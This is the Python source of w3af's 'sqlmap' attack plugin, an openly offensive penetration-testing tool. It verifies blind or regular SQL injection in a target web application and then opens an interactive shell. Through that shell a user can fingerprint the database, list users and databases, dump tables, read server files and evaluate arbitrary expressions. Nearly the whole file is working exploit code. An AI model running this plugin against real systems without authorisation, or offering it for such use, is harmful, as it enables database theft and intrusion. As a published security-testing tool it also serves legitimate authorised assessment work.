'''
sqlmap.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.data.kb.shell import shell as shell

import core.data.request.httpPostDataRequest as httpPostDataRequest
import core.data.request.httpQsRequest as httpQsRequest

import core.controllers.outputManager as om
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln

from core.controllers.w3afException import w3afException

from plugins.attack.db.dbDriverBuilder import dbDriverBuilder as dbDriverBuilder
from core.controllers.sql_tools.blind_sqli_response_diff import blind_sqli_response_diff
from core.data.parsers.urlParser import parse_qs, url_object
from core.controllers.threads.threadManager import threadManagerObj as tm

# options
from core.data.options.option import option
from core.data.options.optionList import optionList

SQLMAPCREATORS = 'sqlmap coded by inquis <bernardo.damele@gmail.com> and belch <daniele.bellucci@gmail.com>'


class sqlmap(baseAttackPlugin):
    '''
    Exploits [blind] sql injections using sqlmap ( http://sqlmap.sf.net ).
    '''
    #Plugin author:
    #@author: Andres Riancho ( andres.riancho@gmail.com )
    
    #sqlmap authors:
    #@author: Bernardo Damele (inquis) - maintainer
    #@author: Daniele Bellucci (belch) - initial author
        
    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._vuln = None
        self._driver = None
        
        # User configured options for fastExploit
        self._url = ''
        self._method = 'GET'
        self._data = ''
        self._injvar = ''
        
        # User configured variables
        self._equalLimit = 0.9
        self._equAlgorithm = 'setIntersection'
        self._goodSamaritan = True
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with [blind] sql injections vulns.
        The options are configured using the plugin options and setOptions() method.
        '''
        om.out.debug( 'Starting sqlmap fastExploit.' )
        om.out.console( SQLMAPCREATORS )
        
        if self._url is None or self._method is None or self._data is None or self._injvar is None:
            raise w3afException('You have to configure the plugin parameters')
        else:
            
            freq = None
            if self._method == 'POST':
                freq = httpPostDataRequest.httpPostDataRequest()
            elif self._method == 'GET':
                freq = httpQsRequest.httpQsRequest()
            else:
                raise w3afException('Method not supported.')
            
            freq.setURL( self._url )
            freq.setDc( parse_qs( self._data ) )
            freq.setHeaders( {} )
            
            bsql = blind_sqli_response_diff()
            bsql.setUrlOpener( self._urlOpener )
            bsql.setEqualLimit( self._equalLimit )
            bsql.setEquAlgorithm( self._equAlgorithm )
            
            vuln_obj = bsql.is_injectable( freq, self._injvar )
            if not vuln_obj:
                raise w3afException('Could not verify SQL injection ' + str(vuln) )
            else:
                om.out.console('SQL injection could be verified, trying to create the DB driver.')
                
                # Try to get a shell using all vuln
                msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
                msg += '. Please wait...'
                om.out.console( msg )
                shell_obj = self._generateShell( vuln_obj )
                if shell_obj is not None:
                    kb.kb.append( self, 'shell', shell_obj )
                    return [shell_obj, ]
                    
                raise w3afException('No exploitable vulnerabilities found.')
        
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getExploitableVulns(self):
        vulns = kb.kb.getData( 'blindSqli' , 'blindSqli' )
        vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
        return vulns

    def canExploit( self, vulnToExploit=None ):
        '''
        Searches the kb for vulnerabilities that the plugin can exploit.

        @return: True if plugin knows how to exploit a found vuln.
        '''
        vulns = self.getExploitableVulns()

        if vulnToExploit is not None:
            vulns = [ v for v in vulns if v.getId() == vulnToExploit ]
            
        if len(vulns) != 0:
            return True
        else:
            om.out.console( 'No [blind] SQL injection vulnerabilities have been found.' )
            om.out.console( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
            msg = 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.'
            om.out.console( msg )
            return False

    def exploit( self, vulnToExploit=None ):
        '''
        Exploits a [blind] sql injections vulns that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling specific_user_input
        '''
        if not self.canExploit():
            return []
        else:
            vulns = kb.kb.getData( 'blindSqli' , 'blindSqli' )
            vulns.extend( kb.kb.getData( 'sqli' , 'sqli' ) )
            
            bsql = blind_sqli_response_diff()
            bsql.setUrlOpener( self._urlOpener )
            bsql.setEqualLimit( self._equalLimit )
            bsql.setEquAlgorithm( self._equAlgorithm )
            
            tmp_vuln_list = []
            for v in vulns:
            
                # Filter the vuln that was selected by the user
                if vulnToExploit is not None:
                    if vulnToExploit != v.getId():
                        continue
            
                mutant = v.getMutant()
                mutant.setModValue( mutant.getOriginalValue() )
                v.setMutant( mutant )
            
                # The user didn't selected anything, or we are in the selected vuln!
                om.out.debug('Verifying vulnerability in URL: "' + v.getURL() + '".')
                vuln_obj = bsql.is_injectable( v.getMutant().getFuzzableReq(), v.getVar() )
                
                if vuln_obj:
                    tmp_vuln_list.append( vuln_obj )
            
            # Ok, go to the next stage with the filtered vulnerabilities
            vulns = tmp_vuln_list
            if len(vulns) == 0:
                om.out.debug('is_injectable failed for all vulnerabilities.')
                return []
            else:
                for vuln_obj in vulns:
                    # Try to get a shell using all vuln
                    msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
                    msg += '. Please wait...' 
                    om.out.console( msg )
                    shell_obj = self._generateShell( vuln_obj )
                    if shell_obj:
                        if self._generateOnlyOne:
                            # A shell was generated, I only need one point of exec.
                            return [shell_obj, ]
                        else:
                            # Keep adding all shells to the kb
                            pass
                
                # FIXME: Am I really saving anything here ?!?!
                return kb.kb.getData( self.getName(), 'shell' )
                
    def _generateShell( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit, as it was saved in the kb or supplied by the user with set commands.
        @return: A sqlmap shell object if sqlmap could fingerprint the database.
        '''
        bsql = blind_sqli_response_diff()
        bsql.setEqualLimit( self._equalLimit )
        bsql.setEquAlgorithm( self._equAlgorithm )
            
        dbBuilder = dbDriverBuilder( self._urlOpener, bsql.equal )
        driver = dbBuilder.getDriverForVuln( vuln_obj )
        if driver is None:
            return None
        else:
            # Create the shell object
            shell_obj = sqlShellObj( vuln_obj )
            shell_obj.setGoodSamaritan( self._goodSamaritan )
            shell_obj.setDriver( driver )
            kb.kb.append( self, 'shells', shell_obj )
            return shell_obj

    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'Method to use with fastExploit()'
        o2 = option('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = option('data', self._data, d3, 'string')

        d4 = 'Variable where to inject with fastExploit()'
        o4 = option('injvar', self._injvar, d4, 'string')

        d5 = 'The algorithm to use in the comparison of true and false response for blind sql.'
        h5 = 'The options are: "stringEq" and "setIntersection". Read the user documentation for'
        h5 += ' details.'
        o5 = option('equAlgorithm', self._equAlgorithm, d5, 'string', help=h5)

        d6 = 'Set the equal limit variable'
        h6 = 'Two pages are equal if they match in more than equalLimit. Only used when'
        h6 += ' equAlgorithm is set to setIntersection.'
        o6 = option('equalLimit', self._equalLimit, d6, 'float', help=h6)

        d7 = 'Enable or disable the good samaritan module'
        h7 = 'The good samaritan module is a the best way to speed up blind sql exploitations.'
        h7 += ' It\'s really simple, you see messages in the console that show the status of the'
        h7 += ' discovery and you can help the discovery. For example, if you see "Micros" you'
        h7 += ' could type "oft", and if it\'s correct, you have made your good action of the day'
        h7 += ', speeded up the discovery AND had fun doing it.'
        o7 = option('goodSamaritan', self._goodSamaritan, d7, 'boolean', help=h7)

        d8 = 'If true, this plugin will try to generate only one shell object.'
        o8 = option('generateOnlyOne', self._generateOnlyOne, d8, 'boolean')
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        ol.add(o6)
        ol.add(o7)
        ol.add(o8)
        return ol


    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        '''
        self._url = url_object( optionsMap['url'].getValue() ).uri2url()
            
        if optionsMap['method'].getValue() not in ['GET', 'POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = optionsMap['method'].getValue()

        self._data = optionsMap['data'].getValue()
        self._injvar = optionsMap['injvar'].getValue()
        self._equAlgorithm = optionsMap['equAlgorithm'].getValue()
        self._equalLimit = optionsMap['equalLimit'].getValue()
        self._goodSamaritan = optionsMap['goodSamaritan'].getValue()
        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.1

    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits [blind] sql injections.
        
        The original sqlmap program was coded by Bernardo Damele and Daniele Bellucci, many thanks to both of
        them.
        
        Six configurable parameters exist:
            - url
            - method
            - data
            - injvar
            - equAlgorithm
            - equalLimit
        '''

class sqlShellObj(shell):
    def _parse( self, command ):
        '''
        @return: The command as a string, and the parameters as a list.
        '''
        cmd = command.split(' ')[0]
        params = command.split(' ')[1:]
        return cmd, params

    def setDriver( self, driver ):
        '''
        @parameter driver: The DB driver from sqlmap.
        '''
        self._driver = driver
    
    def setGoodSamaritan( self, good_samaritan ):
        '''
        @parameter good_samaritan: A boolean that indicates if we are going to use it or not.
        '''
        self._goodSamaritan = good_samaritan
    
    def specific_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "dbs", "users", etc ).
        @return: The result of the command.
        '''
        if not self._driver:
            raise w3afException('No driver could be created.')
        
        _methodMap = {}
        _methodMap['fingerprint'] = self._driver.getFingerprint
        _methodMap['banner'] = self._driver.getBanner
        _methodMap['current-user'] = self._driver.getCurrentUser
        _methodMap['current-db'] = self._driver.getCurrentDb
        _methodMap['users'] = self._driver.getUsers
        _methodMap['dbs'] = self._driver.getDbs
        _methodMap['tables'] = self._driver.auxGetTables
        _methodMap['columns'] = self._driver.auxGetColumns
        _methodMap['dump'] = self._driver.auxDump
        _methodMap['file'] = self._driver.getFile
        _methodMap['expression'] = self._driver.getExpr
        _methodMap['union-check'] = self._driver.unionCheck
        _methodMap['help'] = self.help
    
        command_list = command.split(' ')
        if not len( command_list ):
            om.out.console('Empty command. Please read the shell help:')
            self.help()
            return ''
        else:
            cmd = command_list[0]
            method = ''
            if command_list[0] in _methodMap:
                method = _methodMap[ cmd ]
            else:
                if self._goodSamaritan and self._driver.isRunningGoodSamaritan():
                    self._driver.goodSamaritanContribution( command )
                    return None
                else:
                    om.out.console('Unknown command: "'+cmd+'". Please read the help:')
                    self.help()
                    return ''

            tm.startFunction( target=self._runCommand, args=(method, command,), ownerObj=self, restrict=False )
            #self._runCommand(method, command)
            return None
            
    def _runCommand( self, method, command ):
        # Parse this, separate user and command
        command, parameterList = self._parse( command )
        args = tuple( parameterList )

        if self._goodSamaritan and command.strip() != 'help':
            self._driver.startGoodSamaritan()
        
        try:
            res = apply( method, args )
        except TypeError:
            res = 'Invalid number of parameters for command.'
        except KeyboardInterrupt, k:
            res = 'The user interrupted the process with Ctrl+C.'
        except w3afException, e:
            res = 'An unexpected error was found while trying to run the specified command.\n'
            res +='Exception: "' + str(e) + '"'
        else:            
            res = self._driver.dump.dump( command, args, res )
            res = res.replace('\n','\r\n')

        # Always stop the good samaritan
        self._driver.stopGoodSamaritan() 
        om.out.console( '\r\n' + res )
        self._showPrompt()

    def _showPrompt( self ):
        om.out.console('w3af/exploit/'+self.getName()+'-'+str(self.getExploitResultId())+'>>>', newLine = False)
        
    def help( self, command ):
        '''
        Print the help to the user.
        '''
        om.out.console('')
        om.out.console( SQLMAPCREATORS )
        om.out.console('fingerprint             perform an exaustive database fingerprint')
        om.out.console('banner                  get database banner')
        om.out.console('current-user            get current database user')
        om.out.console('current-db              get current database name')
        om.out.console('users                   get database users')
        om.out.console('dbs                     get available databases')
        om.out.console('tables [db]             get available databases tables (optional: database)')
        om.out.console('columns <table> [db]    get table columns (required: table optional: database)')
        om.out.console('dump <table> [db]       dump a database table (required: -T optional: -D)')
        om.out.console('file <FILENAME>         read a specific file content')
        om.out.console('expression <EXPRESSION> expression to evaluate')
        om.out.console('union-check             check for UNION sql injection')
        self._showPrompt()
        return True
    
    def _identifyOs( self ):
        # hmmm....
        self._rSystem = self._rSystemName = self._dbms = self._driver.getFingerprint()
        self._rUser = self._driver.getCurrentUser()
    
    def getRemoteSystem( self ):
        return self._dbms

    def __repr__( self ):
        if not self._rOS:
            self._identifyOs()
        return '<sql object ( dbms: "'+self._dbms+'" | ruser: "'+ self._rUser +'" )>'
        
    __str__ = __repr__
    def end( self ):
        om.out.debug('sqlmap cleanup complete.')
            
    def getName( self ):
        return 'sqlmap'
        
    def end_interaction(self):
        '''
        When the user executes "exit" in the console, this method is called.
        Basically, here we handle WHAT TO DO in that case. In most cases (and this is
        why we implemented it this way here) the response is "yes, do it end me" that
        equals to "return True".
        
        In some other cases, the shell prints something to the console and then exists,
        or maybe some other, more complex, thing.
        '''
        if self._goodSamaritan and self._driver.isRunningGoodSamaritan():
            # Keep the user locked inside this shell until the good samaritan ain't working
            # anymore
            #print 'a' * 33
            return False
        else:
            # Exit this shell
            return True
